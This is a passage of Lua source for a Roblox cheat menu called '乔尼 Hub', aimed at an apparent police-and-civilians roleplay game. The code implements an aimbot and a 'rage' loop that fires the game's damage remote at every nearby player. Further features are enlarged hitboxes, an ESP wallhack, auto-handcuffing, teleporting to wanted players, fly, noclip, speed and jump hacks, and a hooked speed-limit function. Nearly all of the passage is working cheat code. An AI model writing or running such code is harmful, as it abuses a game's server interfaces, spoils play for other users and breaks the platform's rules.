		if target then
			if AimConfig.showTracer then
				AimTracer.From = center
				AimTracer.To = Vector2.new(target.screen.X, target.screen.Y)
				AimTracer.Color = color
				AimTracer.Thickness = 2
				AimTracer.Transparency = 0.5
				AimTracer.Visible = true
			end
			local targetPos = target.part.Position
			if AimConfig.prediction then
				targetPos = targetPos + target.part.AssemblyLinearVelocity * dt * 1.5
			end
			local targetCF = CFrame.new(camera.CFrame.Position, targetPos)
			camera.CFrame = AimConfig.smoothness >= 1 and targetCF or camera.CFrame:Lerp(targetCF, AimConfig.smoothness)
		end
	end
end)
local RageConfig = {
	enabled = false,
	range = 150,
	interval = 0.05,
	bodyPart = "Head",
	jobCheck = false,
	wallCheck = false,
	aliveCheck = false,
	combatCheck = false,
	policeLock = false,
	civilianLock = false,
	beam = false,
}
local RageBodyParts = {
	["头部"] = "Head",
	["躯干"] = "Torso",
	["左臂"] = "LeftArm",
	["右臂"] = "RightArm",
	["左腿"] = "LeftLeg",
	["右腿"] = "RightLeg"
}
local function createBeam(startPos, endPos)
	local p1 = Instance.new("Part")
	local p2 = Instance.new("Part")
	for _, p in ipairs({
		p1,
		p2
	}) do
		p.Anchored = true;
		p.CanCollide = false;
		p.Transparency = 1;
		p.Size = Vector3.new(0.1, 0.1, 0.1);
		p.Parent = Workspace
	end
	p1.Position = startPos;
	p2.Position = endPos
	local a1 = Instance.new("Attachment", p1)
	local a2 = Instance.new("Attachment", p2)
	local beam = Instance.new("Beam", p1)
	beam.Attachment0 = a1;
	beam.Attachment1 = a2;
	beam.Width0 = 0.15;
	beam.Width1 = 0.15
	beam.Color = ColorSequence.new(Color3.fromRGB(180, 200, 255))
	task.delay(0.8, function()
		pcall(function()
			p1:Destroy();
			p2:Destroy()
		end)
	end)
end
task.spawn(function()
	while true do
		if RageConfig.enabled and PlayerEvent then
			local _, _, myRoot = GetCharacter(LocalPlayer)
			if myRoot then
				EquipWeapon()
				local myPos = myRoot.Position
				local myJob = GetPlayerJob(LocalPlayer)
				for _, player in ipairs(Players:GetPlayers()) do
					if player ~= LocalPlayer and targetAllowed(player, RageConfig.policeLock, RageConfig.civilianLock) and inCombat(player, RageConfig.combatCheck) then
						local char, hum, root = GetCharacter(player)
						if char and hum and root and hum.Health > 0 then
							if RageConfig.jobCheck and GetPlayerJob(player) == myJob then
								continue
							end
							if (root.Position - myPos).Magnitude <= RageConfig.range then
								if RageConfig.wallCheck then
									local params = RaycastParams.new()
									params.FilterDescendantsInstances = {
										LocalPlayer.Character,
										Workspace.CurrentCamera
									}
									params.FilterType = Enum.RaycastFilterType.Exclude
									local hit = Workspace:Raycast(Workspace.CurrentCamera.CFrame.Position, root.Position - Workspace.CurrentCamera.CFrame.Position, params)
									if hit and not hit.Instance:IsDescendantOf(char) then
										continue
									end
								end
								pcall(function()
									PlayerEvent:FireServer("damage", {
										bodyParts = {
											{
												RageConfig.bodyPart,
												1
											}
										},
										shotCode = {
											myPos,
											(root.Position - myPos).Unit
										},
										pos = root.Position,
										target = player,
										damageFactor = 1.5,
										bulletProofTool = false,
									})
									if RageConfig.beam then
										createBeam(myPos, root.Position)
									end
								end)
							end
						end
					end
				end
			end
		end
		task.wait(RageConfig.interval)
	end
end)
local HitboxConfig = {
	active = false,
	size = 10,
	transparency = 0.7,
	teamCheck = false,
	color = "红色",
	material = "Neon",
	rainbow = false,
	checkCorpses = false,
	outline = false,
	collision = false,
	glow = false,
	pulse = false,
	affectNPC = false,
}
local hitboxOriginal = {}
local function resetHitbox(char)
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if not root then
		return
	end
	local orig = hitboxOriginal[root]
	if orig then
		root.Size = orig.Size
		root.Transparency = orig.Transparency
		root.Material = orig.Material
		root.CanCollide = orig.CanCollide
		root.Color = orig.Color
	end
	local h = root:FindFirstChild("乔尼_HitboxHighlight")
	if h then
		h:Destroy()
	end
	local l = root:FindFirstChild("乔尼_HitboxLight")
	if l then
		l:Destroy()
	end
end
local function applyHitbox(char)
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if not root then
		return
	end
	if not hitboxOriginal[root] then
		hitboxOriginal[root] = {
			Size = root.Size,
			Transparency = root.Transparency,
			Material = root.Material,
			CanCollide = root.CanCollide,
			Color = root.Color
		}
	end
	if not HitboxConfig.active then
		resetHitbox(char);
		return
	end
	local hum = char:FindFirstChildOfClass("Humanoid")
	if HitboxConfig.checkCorpses and hum and hum.Health <= 0 then
		resetHitbox(char);
		return
	end
	local size = HitboxConfig.size
	if HitboxConfig.pulse then
		size = size * (math.sin(tick() * 2) * 0.2 + 1)
	end
	root.Size = Vector3.new(size, size, size)
	root.Transparency = HitboxConfig.transparency
	root.Material = Enum.Material[HitboxConfig.material] or Enum.Material.Neon
	root.CanCollide = HitboxConfig.collision
	root.Color = HitboxConfig.rainbow and GetRainbowColor(5) or GetColor(HitboxConfig.color)
	if HitboxConfig.outline then
		local hl = root:FindFirstChild("乔尼_HitboxHighlight") or Instance.new("Highlight")
		hl.Name = "乔尼_HitboxHighlight"
		hl.FillTransparency = 1
		hl.OutlineColor = root.Color
		hl.OutlineTransparency = HitboxConfig.transparency
		hl.Parent = root
	else
		local hl = root:FindFirstChild("乔尼_HitboxHighlight")
		if hl then
			hl:Destroy()
		end
	end
	if HitboxConfig.glow then
		local light = root:FindFirstChild("乔尼_HitboxLight") or Instance.new("PointLight")
		light.Name = "乔尼_HitboxLight"
		light.Brightness = 5
		light.Range = 15
		light.Color = root.Color
		light.Parent = root
	else
		local light = root:FindFirstChild("乔尼_HitboxLight")
		if light then
			light:Destroy()
		end
	end
end
RunService.Heartbeat:Connect(function()
	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= LocalPlayer and player.Character then
			if HitboxConfig.teamCheck and LocalPlayer.Team and player.Team == LocalPlayer.Team then
				resetHitbox(player.Character)
			else
				applyHitbox(player.Character)
			end
		end
	end
	if HitboxConfig.affectNPC then
		for _, obj in ipairs(Workspace:GetDescendants()) do
			if obj:IsA("Model") and obj:FindFirstChildOfClass("Humanoid") and not Players:GetPlayerFromCharacter(obj) then
				applyHitbox(obj)
			end
		end
	end
end)
local ESP = {
	enabled = false,
	name = true,
	distance = true,
	health = true,
	highlight = true,
	tracer = false,
	tracerOrigin = "屏幕底部",
	showFugitive = true,
	selectedTeams = {
		Chef = true,
		Civilian = true,
		Delivery = true,
		Farmer = true,
		Fire = true,
		Police = true,
		Medical = true,
		Prisoner = true,
		["Road Service"] = true,
		Transit = true
	},
	trackers = {},
}
local TeamNames = {
	Chef = "厨师",
	Civilian = "平民",
	Delivery = "配送员",
	Farmer = "农民",
	Fire = "消防员",
	Police = "警察",
	Medical = "医护人员",
	Prisoner = "囚犯",
	["Road Service"] = "道路服务",
	Transit = "交通"
}
local TeamColors = {
	Chef = Color3.fromRGB(255, 200, 0),
	Civilian = Color3.fromRGB(100, 200, 255),
	Delivery = Color3.fromRGB(255, 150, 50),
	Farmer = Color3.fromRGB(50, 200, 50),
	Fire = Color3.fromRGB(255, 50, 50),
	Police = Color3.fromRGB(50, 100, 255),
	Medical = Color3.fromRGB(255, 50, 255),
	Prisoner = Color3.fromRGB(255, 150, 150),
	["Road Service"] = Color3.fromRGB(255, 255, 100),
	Transit = Color3.fromRGB(100, 255, 255)
}
local function isFugitive(player)
	return player.Team and player.Team.Name == "Civilian" and (player:GetAttribute("CombatMode") or player:GetAttribute("Pursuit"))
end
local function espAllowed(player)
	if not ESP.enabled or player == LocalPlayer or not player.Character then
		return false
	end
	if ESP.showFugitive and isFugitive(player) then
		return true
	end
	local team = player.Team and player.Team.Name
	return team and ESP.selectedTeams[team] == true
end
local function removeESP(player)
	local t = ESP.trackers[player]
	if not t then
		return
	end
	for _, obj in pairs(t) do
		pcall(function()
			if typeof(obj) == "RBXScriptConnection" then
				obj:Disconnect()
			elseif typeof(obj) == "Instance" then
				obj:Destroy()
			elseif type(obj) == "userdata" and obj.Remove then
				obj:Remove()
			end
		end)
	end
	ESP.trackers[player] = nil
end
local function createESP(player)
	removeESP(player)
	if not espAllowed(player) then
		return
	end
	local char = player.Character
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if not root then
		return
	end
	local uiParent = UI_PARENT or resolveGuiParent()
	if not uiParent then
		return
	end
	local bill = Instance.new("BillboardGui")
	bill.Name = "PlayerESP_" .. player.Name
	bill.AlwaysOnTop = true
	bill.Size = UDim2.new(4, 0, 4, 0)
	bill.StudsOffset = Vector3.new(0, 3, 0)
	bill.Adornee = root
	bill.Parent = uiParent
	local frame = Instance.new("Frame")
	frame.BackgroundTransparency = 1
	frame.Size = UDim2.fromScale(1, 1)
	frame.Parent = bill
	local name = Instance.new("TextLabel")
	name.Size = UDim2.new(1, 0, 0.5, 0)
	name.BackgroundTransparency = 1
	name.Font = Enum.Font.SourceSansBold
	name.TextSize = 14
	name.TextStrokeTransparency = 0.5
	name.Parent = frame
	local info = Instance.new("TextLabel")
	info.Size = UDim2.new(1, 0, 0.5, 0)
	info.Position = UDim2.new(0, 0, 0.5, 0)
	info.BackgroundTransparency = 1
	info.Font = Enum.Font.SourceSans
	info.TextSize = 12
	info.TextStrokeTransparency = 0.5
	info.Parent = frame
	local highlight = Instance.new("Highlight")
	highlight.Name = "PlayerESP_Highlight"
	highlight.Adornee = char
	highlight.FillTransparency = 0.7
	highlight.OutlineTransparency = 0
	highlight.Parent = uiParent
	local tracer = Drawing.new("Line")
	tracer.Thickness = 1
	tracer.Transparency = 0.5
	tracer.Visible = false
	local update = RunService.Heartbeat:Connect(function()
		if not espAllowed(player) or not player.Character or not root.Parent then
			tracer.Visible = false
			if bill.Parent then
				bill.Enabled = false
			end
			return
		end
		bill.Enabled = true
		local fug = ESP.showFugitive and isFugitive(player)
		local team = player.Team and player.Team.Name
		local color = fug and Color3.fromRGB(255, 0, 0) or TeamColors[team] or Color3.fromRGB(0, 255, 0)
		local teamName = fug and "逃犯" or TeamNames[team] or (team or "未知")
		name.Text = "[" .. teamName .. "] " .. player.Name
		name.TextColor3 = color
		name.Visible = ESP.name
		highlight.FillColor = color
		highlight.OutlineColor = color
		highlight.Enabled = ESP.highlight
		local _, hum = GetCharacter(player)
		local _, _, myRoot = GetCharacter(LocalPlayer)
		local parts = {}
		if ESP.distance and myRoot then
			table.insert(parts, string.format("%.1f", (myRoot.Position - root.Position).Magnitude))
		end
		if ESP.health and hum then
			table.insert(parts, tostring(math.floor(hum.Health)))
		end
		info.Text = # parts > 0 and ("[" .. table.concat(parts, "/") .. "]") or ""
		info.TextColor3 = color
		info.Visible = ESP.distance or ESP.health
		local cam = Workspace.CurrentCamera
		if ESP.tracer and cam then
			local screen, onScreen = cam:WorldToViewportPoint(root.Position)
			if onScreen then
				local vp = cam.ViewportSize
				if ESP.tracerOrigin == "屏幕中心" then
					tracer.From = Vector2.new(vp.X / 2, vp.Y / 2)
				elseif ESP.tracerOrigin == "屏幕顶部" then
					tracer.From = Vector2.new(vp.X / 2, 0)
				else
					tracer.From = Vector2.new(vp.X / 2, vp.Y)
				end
				tracer.To = Vector2.new(screen.X, screen.Y)
				tracer.Color = color
				tracer.Visible = true
			else
				tracer.Visible = false
			end
		else
			tracer.Visible = false
		end
	end)
	ESP.trackers[player] = {
		bill = bill,
		highlight = highlight,
		tracer = tracer,
		update = update
	}
end
local function refreshESP()
	for player in pairs(ESP.trackers) do
		if not espAllowed(player) then
			removeESP(player)
		end
	end
	if ESP.enabled then
		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= LocalPlayer and espAllowed(player) and not ESP.trackers[player] then
				createESP(player)
			end
		end
	end
end
Players.PlayerAdded:Connect(function(player)
	player.CharacterAdded:Connect(function()
		task.wait(0.5)
		if ESP.enabled then
			createESP(player)
		end
	end)
end)
Players.PlayerRemoving:Connect(removeESP)
RunService.Heartbeat:Connect(function()
	if ESP.enabled then
		refreshESP()
	end
end)
local PoliceConfig = {
	range = 200,
	delay = 0.5,
	combatCheck = false,
	teleport = false
}
local autoCuffThread
local function startAutoCuff()
	if autoCuffThread then
		return
	end
	autoCuffThread = task.spawn(function()
		while State.autoCuff do
			local _, _, myRoot = GetCharacter(LocalPlayer)
			if myRoot and PlayerFunc then
				for _, player in ipairs(Players:GetPlayers()) do
					if player ~= LocalPlayer and IsAlive(player) and inCombat(player, PoliceConfig.combatCheck) then
						local _, _, root = GetCharacter(player)
						if root and (root.Position - myRoot.Position).Magnitude <= PoliceConfig.range then
							pcall(function()
								PlayerFunc:InvokeServer("handcuff", player, false)
							end)
						end
					end
				end
				if PoliceConfig.teleport then
					local nearest, nearestDist
					for _, player in ipairs(Players:GetPlayers()) do
						if player ~= LocalPlayer and player.Team and player.Team.Name == "Civilian" and (player:GetAttribute("WantedLevel") or 0) > 0 then
							local _, _, root = GetCharacter(player)
							if root then
								local d = (root.Position - myRoot.Position).Magnitude
								if d <= PoliceConfig.range and (not nearestDist or d < nearestDist) then
									nearest, nearestDist = player, d
								end
							end
						end
					end
					if nearest then
						local _, _, targetRoot = GetCharacter(nearest)
						if targetRoot then
							myRoot.CFrame = CFrame.new(targetRoot.Position - targetRoot.CFrame.LookVector * 3)
						end
					end
				end
			end
			task.wait(PoliceConfig.delay)
		end
		autoCuffThread = nil
	end)
end
local PlayerConfig = {
	walkEnabled = false,
	walkSpeed = 200,
	jumpEnabled = false,
	jumpPower = 50,
	jumpMultiplier = 1,
	infiniteJump = false,
	flyEnabled = false,
	flySpeed = 30,
	flyMode = "传送",
	noclip = false,
}
local PlayerRuntime = {
	walkConn = nil,
	jumpConn = nil,
	flyConn = nil,
	bodyVelocity = nil,
	bodyGyro = nil,
	noclipConn = nil,
	collisionCache = {},
}
local playerQuickGui
local playerQuickButton
local playerQuickShown = false
local playerQuickLocked = false
local playerQuickPos = UDim2.new(0, 100, 0.5, - 25)
local playerQuickRainbow
local playerFlyToggle
local PlayerControls = nil
pcall(function()
	PlayerControls = require(LocalPlayer.PlayerScripts:WaitForChild("PlayerModule")):GetControls()
end)
local function stopWalkLoop()
	if PlayerRuntime.walkConn then
		PlayerRuntime.walkConn:Disconnect()
		PlayerRuntime.walkConn = nil
	end
end
local function startWalkLoop()
	stopWalkLoop()
	if not PlayerConfig.walkEnabled then
		return
	end
	PlayerRuntime.walkConn = RunService.Heartbeat:Connect(function()
		local _, hum = GetCharacter(LocalPlayer)
		if hum and PlayerConfig.walkEnabled then
			hum.WalkSpeed = PlayerConfig.walkSpeed
		end
	end)
end
local function isGrounded(hum)
	if not hum then
		return false
	end
	local state = hum:GetState()
	return state == Enum.HumanoidStateType.Landed or state == Enum.HumanoidStateType.Running or state == Enum.HumanoidStateType.RunningNoPhysics
end
local function stopJumpHandler()
	if PlayerRuntime.jumpConn then
		PlayerRuntime.jumpConn:Disconnect()
		PlayerRuntime.jumpConn = nil
	end
end
local function startJumpHandler()
	stopJumpHandler()
	if not PlayerConfig.jumpEnabled then
		return
	end
	PlayerRuntime.jumpConn = UserInputService.JumpRequest:Connect(function()
		if not PlayerConfig.jumpEnabled then
			return
		end
		local _, hum, root = GetCharacter(LocalPlayer)
		if not hum or not root or hum.Health <= 0 then
			return
		end
		if not PlayerConfig.infiniteJump and not isGrounded(hum) then
			return
		end
		local height = PlayerConfig.jumpPower * PlayerConfig.jumpMultiplier * 0.1
		root.CFrame = root.CFrame + Vector3.new(0, height, 0)
	end)
end
local function clearPhysicalFly()
	if PlayerRuntime.flyConn then
		PlayerRuntime.flyConn:Disconnect()
		PlayerRuntime.flyConn = nil
	end
	if PlayerRuntime.bodyVelocity then
		PlayerRuntime.bodyVelocity:Destroy()
		PlayerRuntime.bodyVelocity = nil
	end
	if PlayerRuntime.bodyGyro then
		PlayerRuntime.bodyGyro:Destroy()
		PlayerRuntime.bodyGyro = nil
	end
	local _, hum = GetCharacter(LocalPlayer)
	if hum then
		hum.PlatformStand = false
		hum.AutoRotate = true
	end
end
local function clearWarpFly()
	if PlayerRuntime.flyConn then
		PlayerRuntime.flyConn:Disconnect()
		PlayerRuntime.flyConn = nil
	end
	local _, hum = GetCharacter(LocalPlayer)
	if hum then
		hum.AutoRotate = true
	end
end
local function updatePlayerQuick()
	if not playerQuickButton then
		return
	end
	playerQuickButton.Text = PlayerConfig.flyEnabled and "飞行: 开" or "飞行: 关"
	playerQuickButton.TextColor3 = PlayerConfig.flyEnabled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
end
local function stopPlayerFly()
	clearPhysicalFly()
	clearWarpFly()
	PlayerConfig.flyEnabled = false
	updatePlayerQuick()
end
local function startWarpFly()
	clearPhysicalFly()
	clearWarpFly()
	local _, hum, root = GetCharacter(LocalPlayer)
	if not root or not hum then
		return
	end
	PlayerConfig.flyEnabled = true
	hum.AutoRotate = false
	PlayerRuntime.flyConn = RunService.RenderStepped:Connect(function(dt)
		if not PlayerConfig.flyEnabled or PlayerConfig.flyMode ~= "传送" then
			return
		end
		local _, currentHum, currentRoot = GetCharacter(LocalPlayer)
		local cam = Workspace.CurrentCamera
		if not currentRoot or not currentHum or not cam then
			return
		end
		local move = PlayerControls and PlayerControls:GetMoveVector() or Vector3.zero
		local direction = cam.CFrame.LookVector * - move.Z + cam.CFrame.RightVector * move.X
		local vertical = 0
		if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
			vertical = 1
		elseif UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
			vertical = - 1
		end
		local delta = (direction + Vector3.new(0, vertical, 0)) * PlayerConfig.flySpeed * dt
		currentRoot.CFrame = currentRoot.CFrame + delta
		currentRoot.AssemblyLinearVelocity = Vector3.zero
		currentRoot.AssemblyAngularVelocity = Vector3.zero
		currentHum:ChangeState(Enum.HumanoidStateType.Climbing)
	end)
	updatePlayerQuick()
end
local function startPhysicalFly()
	clearWarpFly()
	clearPhysicalFly()
	local _, hum, root = GetCharacter(LocalPlayer)
	if not root or not hum then
		return
	end
	PlayerConfig.flyEnabled = true
	local bv = Instance.new("BodyVelocity")
	bv.Name = "乔尼PlayerFlyVelocity"
	bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
	bv.Velocity = Vector3.zero
	bv.Parent = root
	PlayerRuntime.bodyVelocity = bv
	local bg = Instance.new("BodyGyro")
	bg.Name = "乔尼PlayerFlyGyro"
	bg.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
	bg.P = 9e4
	bg.Parent = root
	PlayerRuntime.bodyGyro = bg
	hum.PlatformStand = true
	hum.AutoRotate = false
	PlayerRuntime.flyConn = RunService.RenderStepped:Connect(function()
		if not PlayerConfig.flyEnabled or PlayerConfig.flyMode ~= "物理" then
			return
		end
		local _, currentHum, currentRoot = GetCharacter(LocalPlayer)
		local cam = Workspace.CurrentCamera
		if not currentRoot or not currentHum or not cam then
			return
		end
		if PlayerRuntime.bodyVelocity and PlayerRuntime.bodyGyro then
			local move = PlayerControls and PlayerControls:GetMoveVector() or Vector3.zero
			local direction = cam.CFrame.LookVector * - move.Z + cam.CFrame.RightVector * move.X
			local vertical = 0
			if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
				vertical = 1
			elseif UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
				vertical = - 1
			end
			PlayerRuntime.bodyVelocity.Velocity = (direction + Vector3.new(0, vertical, 0)) * PlayerConfig.flySpeed
			PlayerRuntime.bodyGyro.CFrame = cam.CFrame
		end
	end)
	updatePlayerQuick()
end
local function startPlayerFly()
	if PlayerConfig.flyMode == "物理" then
		startPhysicalFly()
	else
		startWarpFly()
	end
end
local function destroyPlayerQuick()
	if playerQuickRainbow then
		playerQuickRainbow:Disconnect()
		playerQuickRainbow = nil
	end
	if playerQuickGui then
		playerQuickGui:Destroy()
		playerQuickGui = nil
		playerQuickButton = nil
	end
end
local function createPlayerQuick()
	destroyPlayerQuick()
	if not playerQuickShown then
		return
	end
	playerQuickGui = Instance.new("ScreenGui")
	playerQuickGui.Name = "PlayerFlyQuickSwitch"
	playerQuickGui.ResetOnSpawn = false
	playerQuickGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	playerQuickGui.Parent = UI_PARENT or resolveGuiParent()
	playerQuickButton = Instance.new("TextButton")
	playerQuickButton.Name = "PlayerFlyButton"
	playerQuickButton.Size = UDim2.new(0, 80, 0, 35)
	playerQuickButton.Position = playerQuickPos
	playerQuickButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	playerQuickButton.BackgroundTransparency = 0.4
	playerQuickButton.BorderSizePixel = 0
	playerQuickButton.Font = Enum.Font.GothamSemibold
	playerQuickButton.TextSize = 12
	playerQuickButton.TextWrapped = true
	playerQuickButton.Active = not playerQuickLocked
	playerQuickButton.Draggable = not playerQuickLocked
	playerQuickButton.Selectable = not playerQuickLocked
	playerQuickButton.Parent = playerQuickGui
	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 8)
	corner.Parent = playerQuickButton
	local stroke = Instance.new("UIStroke")
	stroke.Name = "RainbowStroke"
	stroke.Thickness = 1.5
	stroke.Parent = playerQuickButton
	playerQuickRainbow = RunService.RenderStepped:Connect(function()
		if stroke.Parent then
			stroke.Color = GetRainbowColor(5)
		end
	end)
	updatePlayerQuick()
	playerQuickButton.MouseButton1Click:Connect(function()
		if PlayerConfig.flyEnabled then
			stopPlayerFly()
		else
			startPlayerFly()
		end
		if playerFlyToggle and type(playerFlyToggle.SetState) == "function" then
			playerFlyToggle:SetState(PlayerConfig.flyEnabled)
		end
	end)
	playerQuickButton:GetPropertyChangedSignal("Position"):Connect(function()
		if not playerQuickLocked then
			playerQuickPos = playerQuickButton.Position
		end
	end)
end
local function restoreNoclip()
	for part, old in pairs(PlayerRuntime.collisionCache) do
		if part and part.Parent then
			pcall(function()
				part.CanCollide = old
			end)
		end
	end
	PlayerRuntime.collisionCache = {}
end
local function stopNoclip()
	if PlayerRuntime.noclipConn then
		PlayerRuntime.noclipConn:Disconnect()
		PlayerRuntime.noclipConn = nil
	end
	restoreNoclip()
end
local function startNoclip()
	stopNoclip()
	if not PlayerConfig.noclip then
		return
	end
	PlayerRuntime.noclipConn = RunService.Stepped:Connect(function()
		if not PlayerConfig.noclip then
			return
		end
		local char = LocalPlayer.Character
		if not char then
			return
		end
		for _, part in ipairs(char:GetDescendants()) do
			if part:IsA("BasePart") then
				if PlayerRuntime.collisionCache[part] == nil then
					PlayerRuntime.collisionCache[part] = part.CanCollide
				end
				part.CanCollide = false
			end
		end
	end)
end
LocalPlayer.CharacterAdded:Connect(function()
	task.wait(0.5)
	PlayerRuntime.collisionCache = {}
	if PlayerConfig.walkEnabled then
		startWalkLoop()
	end
	if PlayerConfig.jumpEnabled then
		startJumpHandler()
	end
	if PlayerConfig.noclip then
		startNoclip()
	end
	if PlayerConfig.flyEnabled then
		local mode = PlayerConfig.flyMode
		PlayerConfig.flyEnabled = false
		task.wait(0.2)
		PlayerConfig.flyMode = mode
		startPlayerFly()
	end
end)
local VehicleFly = {
	active = false,
	speed = 50,
	bv = nil,
	bg = nil,
	conn = nil
}
local vehicleQuickGui
local vehicleQuickButton
local vehicleQuickShown = false
local vehicleQuickLocked = false
local vehicleQuickPos = UDim2.new(0, 10, 0.5, - 25)
local vehicleQuickRainbow
local function updateVehicleQuick()
	if vehicleQuickButton then
		vehicleQuickButton.Text = VehicleFly.active and "飞车: 开" or "飞车: 关"
		vehicleQuickButton.TextColor3 = VehicleFly.active and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
	end
end
local function stopVehicleFly()
	VehicleFly.active = false
	if VehicleFly.conn then
		VehicleFly.conn:Disconnect();
		VehicleFly.conn = nil
	end
	if VehicleFly.bv then
		VehicleFly.bv:Destroy();
		VehicleFly.bv = nil
	end
	if VehicleFly.bg then
		VehicleFly.bg:Destroy();
		VehicleFly.bg = nil
	end
	updateVehicleQuick()
end
local function startVehicleFly()
	local _, _, root = GetCharacter(LocalPlayer)
	if not root then
		return
	end
	stopVehicleFly()
	VehicleFly.active = true
	VehicleFly.bv = Instance.new("BodyVelocity")
	VehicleFly.bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
	VehicleFly.bv.Parent = root
	VehicleFly.bg = Instance.new("BodyGyro")
	VehicleFly.bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
	VehicleFly.bg.Parent = root
	VehicleFly.conn = RunService.Heartbeat:Connect(function()
		local cam = Workspace.CurrentCamera
		if VehicleFly.active and cam and VehicleFly.bv and VehicleFly.bg then
			VehicleFly.bg.CFrame = cam.CFrame
			VehicleFly.bv.Velocity = cam.CFrame.LookVector * VehicleFly.speed
		end
	end)
	updateVehicleQuick()
end
local function destroyVehicleQuick()
	if vehicleQuickRainbow then
		vehicleQuickRainbow:Disconnect();
		vehicleQuickRainbow = nil
	end
	if vehicleQuickGui then
		vehicleQuickGui:Destroy();
		vehicleQuickGui = nil;
		vehicleQuickButton = nil
	end
end
local function createVehicleQuick()
	destroyVehicleQuick()
	if not vehicleQuickShown then
		return
	end
	vehicleQuickGui = Instance.new("ScreenGui")
	vehicleQuickGui.Name = "VehicleFlyQuickSwitch"
	vehicleQuickGui.ResetOnSpawn = false
	vehicleQuickGui.Parent = UI_PARENT or resolveGuiParent()
	vehicleQuickButton = Instance.new("TextButton")
	vehicleQuickButton.Size = UDim2.new(0, 80, 0, 35)
	vehicleQuickButton.Position = vehicleQuickPos
	vehicleQuickButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	vehicleQuickButton.BackgroundTransparency = 0.4
	vehicleQuickButton.BorderSizePixel = 0
	vehicleQuickButton.Font = Enum.Font.GothamSemibold
	vehicleQuickButton.TextSize = 12
	vehicleQuickButton.Parent = vehicleQuickGui
	vehicleQuickButton.Active = not vehicleQuickLocked
	vehicleQuickButton.Draggable = not vehicleQuickLocked
	local c = Instance.new("UICorner", vehicleQuickButton);
	c.CornerRadius = UDim.new(0, 8)
	local s = Instance.new("UIStroke", vehicleQuickButton);
	s.Thickness = 1.5
	vehicleQuickRainbow = RunService.RenderStepped:Connect(function()
		if s.Parent then
			s.Color = GetRainbowColor(5)
		end
	end)
	updateVehicleQuick()
	vehicleQuickButton.MouseButton1Click:Connect(function()
		if VehicleFly.active then
			stopVehicleFly()
		else
			startVehicleFly()
		end
	end)
	vehicleQuickButton:GetPropertyChangedSignal("Position"):Connect(function()
		if not vehicleQuickLocked then
			vehicleQuickPos = vehicleQuickButton.Position
		end
	end)
end
local speedLimitEnabled = false
local originalGetSpeedLimit
pcall(function()
	local Algorithms = require(ReplicatedStorage.Modules.Algorithms)
	originalGetSpeedLimit = Algorithms.getSpeedLimitAtPos
	Algorithms.getSpeedLimitAtPos = function(...)
		if speedLimitEnabled then
			return 9999
		end
		return originalGetSpeedLimit(...)
	end
end)
local function createMainWindow()
	if mainWindow then
		pcall(function()
			mainWindow:Destroy()
		end)
		mainWindow = nil
	end
	mainWindow = WindUI:CreateWindow({
		Title = "乔尼 Hub 免费版/圣奥里<font color='#00FF00'>融合版</font>",
		Icon = "zap",
		IconTransparency = 0.5,
		IconThemed = true,
		Author = "乔尼",
		Folder = "乔尼",
		Size = UDim2.fromOffset(640, 460),
		Transparent = true,
		Theme = "Dark",
		User = {
			Enabled = false,
			Callback = function()
			end,
			Anonymous = false
		},
		SideBarWidth = 200,
		ScrollBarEnabled = true,
		Background = getRandomBackground(),
		BackgroundImageTransparency = 0.4,
	})
	isWindowOpen = true
	local Gui = mainWindow.Parent
	if Gui then
		local function applyFont(obj)
			if obj:IsA("TextLabel") or obj:IsA("TextButton") then
				if obj.Font ~= Enum.Font.Code then
					obj.Font = Enum.Font.PermanentMarker
				end
			end
		end
		for _, v in ipairs(Gui:GetDescendants()) do
			applyFont(v)
		end
		Gui.DescendantAdded:Connect(applyFont)
	end
	local TimeTag = mainWindow:Tag({
		Title = "当前时间: 00:00:00",
		Icon = "clock",
		Color = Color3.fromHex("#FFFFFF"),
		Border = true
	})
	local lastUpdate = 0
	RunService.Heartbeat:Connect(function()
		if tick() - lastUpdate >= 0.1 then
			TimeTag:SetTitle("当前时间: " .. os.date("!%H:%M:%S", os.time() + 28800))
			lastUpdate = tick()
		end
	end)
	mainWindow:EditOpenButton({
		Title = "乔尼 Hub 免费版<font color='#00FF00'>1.0</font>",
		Icon = "crown",
		CornerRadius = UDim.new(1, 16),
		StrokeThickness = 1.5,
		Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.fromHex("FF1493")),
			ColorSequenceKeypoint.new(0.3, Color3.fromHex("FF69B4")),
			ColorSequenceKeypoint.new(0.6, Color3.fromHex("FFB6C1")),
			ColorSequenceKeypoint.new(1, Color3.fromHex("FFC0CB")),
		}),
		Draggable = true,
	})
	local mainFrame = mainWindow.UIElements.Main
	if mainFrame then
		local stroke = Instance.new("UIStroke")
		stroke.Name = "MainBorder"
		stroke.Thickness = 3
		stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		stroke.LineJoinMode = Enum.LineJoinMode.Round
		stroke.Enabled = settings.borderEnabled
		stroke.Parent = mainFrame
		local gradient = Instance.new("UIGradient")
		gradient.Name = "BorderGradient"
		gradient.Parent = stroke
		applyBorderColor(nil, settings.isBorderRainbow ~= false)
	end
	local Home = mainWindow:Tab({
		Title = "主页",
		Icon = "home",
		Locked = false
	})
	Home:Paragraph({
		Title = "乔尼 Hub 免费版",
		Desc = "圣奥里融合版",
		Image = "zap",
		ImageSize = 32
	})
	Home:Paragraph({
		Title = "玩家",
		Desc = "当前服务器ID: " .. game.PlaceId,
		Image = "users",
		ImageSize = 32
	})
	local SettingsTab = mainWindow:Tab({
		Title = "UI设置",
		Icon = "settings",
		Locked = false
	})
	SettingsTab:Toggle({
		Title = "自定义光标",
		Value = false,
		Callback = function(v)
			mainWindow:ToggleCustomCursor(v)
		end
	})
